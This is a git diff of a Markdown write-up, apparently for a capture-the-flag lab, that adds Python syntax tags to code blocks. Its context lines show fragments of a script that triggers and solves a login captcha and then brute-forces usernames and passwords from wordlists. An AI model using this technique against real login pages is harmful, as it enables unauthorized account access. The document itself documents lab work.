@@ -46,7 +46,7 @@ From what I learned about the web application, I had to create a script that wou
 I used these tasks to break about my code into smaller parts. The actual code is available at the top of this page, but you can also access it [here](https://https://github.com/wsmaxcy/capture/capture.py).
 
  - [X]  Load both `usernames.txt` and `passwords.txt` into the program.
-```
+```python
 # load list of usernames
 def load_users():
 	users = list()
@@ -66,9 +66,8 @@ def load_passwords():
 	return passwords
 
 ```
-
 - [x]  Trigger the captcha.
-```
+```python
 # sends 10 requests in order start the captcha
 for i in range(10):
 	data = {
@@ -81,7 +80,7 @@ for i in range(10):
  - [x]  Find way to identify the elements in the captcha:
    - [x]  Opperands
    - [x]  Opperant
-```
+```python
 # username and password
 person = ''
 password = ''
@@ -119,7 +118,7 @@ password = ''
 ```
  - [x]  Send correct captcha to the server while enumerating `usernames.txt`.
  - [x]  Once username is found, enumerate `passwords.txt`
-```
+```python
 # iterates through usernames list
 for name in users:
 	cur = send_request(name, 'password', cur)
@@ -138,7 +137,7 @@ for p in passwords:
 		break
 ```
 - [x]  Print out correct username and password.
-```
+```python
 # final print of username and password
 print('[+] Username: ' + person)
 print('[+] Password: ' + password)
